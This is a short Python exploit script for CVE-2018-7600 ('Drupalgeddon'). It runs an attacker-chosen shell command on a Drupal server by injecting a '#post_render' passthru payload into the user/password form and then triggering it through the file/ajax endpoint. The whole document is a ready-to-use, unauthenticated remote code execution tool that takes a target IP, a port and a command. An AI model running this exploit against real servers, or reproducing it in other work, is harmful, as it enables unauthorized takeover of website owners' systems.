#!/usr/bin/python3

# author: dugisan3rd

import sys
import argparse
import requests
import re

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="CVE-2018-7600: Drupal Blind RCE (drupalgeddon)")
    parser.add_argument("-r", "--rhost", help="Target IP")
    parser.add_argument("-p", "--rport", help="Target port", type=int, default=80)
    parser.add_argument("-x", "--command", help="Command to execute")
    args = parser.parse_args()
    rhost = args.rhost
    rport = args.rport
    command = args.command
    if len(sys.argv) < 2:
        print('[+] Argument required! Please use -h for more details')
    else:
        if rhost and rport and command is not None:
            url = f"http://{rhost}:{rport}/?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]={command}"
            data = {"form_id": "user_pass", "_triggering_element_name": "name"}
            r = requests.post(url, data=data, verify=False)
            print("[+] Injecting payload")
            form = re.search('<input type="hidden" name="form_build_id" value="(.*?)" />', r.text)
            if form is not None:
                form_build_id = form.group(1)
                data = {"form_build_id": form_build_id}
                url = f"http://{rhost}:{rport}/file/ajax/name/%23value/{form_build_id}"
                print("[+] Triggering payload")
                r = requests.post(url, data=data, verify=False)
            else:
                print("[+] 'form_build_id' is not found!")
        else:
            print("[+] Missing arguments!")